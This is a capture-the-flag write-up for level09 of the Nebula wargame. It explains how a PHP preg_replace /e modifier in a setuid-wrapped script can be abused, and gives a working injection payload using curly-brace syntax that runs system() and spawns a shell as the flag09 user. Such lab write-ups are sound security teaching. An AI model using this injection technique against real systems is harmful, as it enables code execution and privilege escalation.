# For level09 in nebula

> There’s a C setuid wrapper for some vulnerable PHP code…
>  
> To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.

In `/home/flag09`, we have 2 files.
```
-rwsr-x--- 1 flag09 level09 7240 2011-11-20 21:22 flag09
-rw-r--r-- 1 root   root     491 2011-11-20 21:22 flag09.php
```

`./flag09` is the setuid wrapper program. It runs `flag09.php` as the user `flag09`. If somehow we can make `flag09.php` execute `getflag`, we'd win.

We are given the source code for the file `flag09.php`.
```
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```

The php program takes 2 arguments, then passes these 2 arguments to the function `markup`. `argv[1]` is the filename of the file that gets read into a string. The string is stored in `$contents`. `$contents` then goes through 3 regex manipulations. 

---
1. `$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);` 

It searches for strings in `$contents` that fit the regex `"/(\[email (.*)\])/e"`.  `"/(\[email (.*)\])"` matches strings like "\[email user@email.com\]".

`/e` is a pattern modifier that allows us to use PHP code within our regular expression. In this case, our PHP code is the `spam` function.

> Outside a character class, a backslash followed by a digit greater than 0 (and possibly further digits) is a back reference to a capturing subpattern earlier (i.e. to its left) in the pattern, provided there have been that many previous capturing left parentheses.

The `\2` in `spam("\2")` (I removed the escaping characters to make it simpler to see) is called a [back reference](http://php.net/manual/en/regexp.reference.back-references.php). In this case, it refers to `(.*)` in `"/(\[email (.*)\])/e"`. As an example, if `$contents` has the string "\[email user@email.com\]", this is how the `spam` function call looks like: `spam("user@email.com")`. `spam` then changes the string to "user AT email dot com". `$contents`now has the string "user AT email dot com"

2. `$contents = preg_replace("/\[/", "<", $contents);`

It simply replaces the string "[" with "<". 

3. `$contents = preg_replace("/\[/", "<", $contents);`

It simply replaces the string "]" with ">". 
---

The manipulated string is then printed out. I tested it out by creating a file with the string "\[email solomon@mail.com\]". It works exactly as described.
```
level09@nebula:/home/flag09$ touch ~/file
level09@nebula:/home/flag09$ echo [email solomon@mail.com] > ~/file 
level09@nebula:/home/flag09$ ./flag09 ~/file ~/file
solomon AT mail dot com
```

There are 2 possible vulnerabilities in this PHP program.
1. Pattern modifier `/e`
2. The unused variable `$use_me` supplied to the program as `argv[2]`.

### Exploiting the vulnerabilities.

Both vulnerabilities come hand in hand.

This [stackoverflow question](https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier) is a good starting point. It gives us an example of the `/e` pattern modifier vulnerability.
```
$password = 'secret';
...
$input = $_GET['input'];
echo preg_replace('|^(.*)$|e', '"\1"', $input);
```
If a malicious user keyed in "$password" as the input, the program would output "secret". This is because `echo preg_replace('|^(.*)$|e', '"\1"', $input);` essentially becomes `echo $password`. The `/e` pattern modifier allows us to access variables that would otherwise not be. One such variable here is `$use_me`. 
```
level09@nebula:/home/flag09$ cat /tmp/2file 
[email $use_me]
level09@nebula:/home/flag09$ ./flag09 /tmp/2file getflag
getflag
```
Our goal is to run `getflag` as user `flag09`. Now, we passed "getflag" as a string to the program. How do we cause it to be executed?

PHP has a function called `system` that executes external commands. Let's try calling `system('getflag')`. The answer lies in [Complex (curly) syntax](http://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex).

This part of the manual is our interest.
> `echo "This is the value of the var named by the return value of getName(): {${getName()}}";`

Let's apply this concept to our challenge.
```
level09@nebula:/home/flag09$ cat /tmp/2file 
[email {${system($use_me)}}]
level09@nebula:/home/flag09$ ./flag09 /tmp/2file getflag
You have successfully executed getflag on a target account
PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1
```

Essentially, `print $output;` becomes `print {${system($use_me)}}`. `system('getflag')` is executed, and `print` prints its output.

In fact, if we so wish, we can get a bash shell!
```
level09@nebula:/home/flag09$ ./flag09 /tmp/2file sh
sh-4.2$ whoami
flag09
sh-4.2$
```
This shows how vulnerable this PHP file really is!

END
